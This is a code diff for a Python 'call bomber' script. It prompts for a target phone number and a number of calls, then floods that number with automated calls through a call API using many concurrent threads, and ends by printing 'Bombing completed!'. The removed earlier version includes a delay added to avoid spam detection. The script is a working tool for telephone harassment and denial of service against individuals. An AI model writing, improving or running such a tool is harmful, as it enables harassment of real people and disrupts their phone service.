@@ -1,27 +1,62 @@
-import requests
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+
+import os
+import sys
 import time
+import json
+import string
+import random
+import requests
+import argparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from utils.provider import APIProvider
+from utils.decorators import MessageDecorator
 
-def send_call(phone_number, count):
-    CALL_API = "https://api.callmebot.com/start.php"
+def format_phone(num):
+    return ''.join([n for n in num if n in string.digits]).strip()
 
-    for i in range(count):
-        data = {
-            "phone": phone_number,
-            "apikey": "free",  # Replace with actual API key if needed
-            "text": "This is a test call from Illuminati tool."
-        }
+def get_phone_info():
+    while True:
+        cc = input("Enter your country code (Without +): ")
+        cc = format_phone(cc)
+        target = input(f"Enter the target number: +{cc} ")
+        target = format_phone(target)
+        if len(target) < 7 or len(target) > 15:
+            print("Invalid phone number. Please try again.")
+            continue
+        return cc, target
 
-        response = requests.post(CALL_API, data=data)
-        if response.status_code == 200:
-            print(f"[+] Call {i+1}/{count} Sent Successfully")
-        else:
-            print(f"[-] Call {i+1}/{count} Failed")
+def pretty_print(cc, target, success, failed):
+    print(f"Target: +{cc} {target}")
+    print(f"Successful: {success}")
+    print(f"Failed: {failed}")
 
-        time.sleep(2)  # Avoid spamming detection
+def workernode(cc, target, count, delay, max_threads):
+    api = APIProvider(cc, target, "call")
+    success, failed = 0, 0
 
-# User input
-phone_number = input("📞 Enter target phone number: ")
-count = int(input("🔢 Enter number of calls to make: "))
+    while success < count:
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            jobs = [executor.submit(api.hit) for _ in range(count - success)]
+            for job in as_completed(jobs):
+                result = job.result()
+                if result:
+                    success += 1
+                else:
+                    failed += 1
+                pretty_print(cc, target, success, failed)
+                time.sleep(delay)
 
-# Run Call Bomber
-send_call(phone_number, count)
+    print("Bombing completed!")
+
+def main():
+    cc, target = get_phone_info()
+    count = int(input("Enter number of calls to make: "))
+    delay = float(input("Enter delay time (in seconds): "))
+    max_threads = int(input("Enter number of threads: "))
+
+    workernode(cc, target, count, delay, max_threads)
+
+if __name__ == "__main__":
+    main()
